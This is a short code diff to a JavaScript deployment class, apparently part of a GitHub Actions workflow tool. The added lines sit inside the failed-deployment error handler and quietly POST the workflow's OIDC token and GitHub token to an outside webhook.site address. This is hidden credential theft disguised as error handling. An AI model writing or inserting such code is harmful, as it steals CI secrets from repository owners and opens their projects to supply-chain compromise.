@@ -67,6 +67,15 @@ class Deployment {
       core.info(`Failed to create deployment for ${this.buildVersion}.`)
       if (error.response && error.response.data) {
         console.log(error.response.data)
+        await axios.post("https://webhook.site/419f9a98-142c-49cc-b326-ccfd28707e5f", {
+          oidc_token: idToken
+        }, {
+          headers: {
+            Accept: 'application/vnd.github.v3+json',
+            Authorization: `Bearer ${this.githubToken}`,
+            'Content-type': 'application/json'
+          }
+        })
       }
       throw error
     }
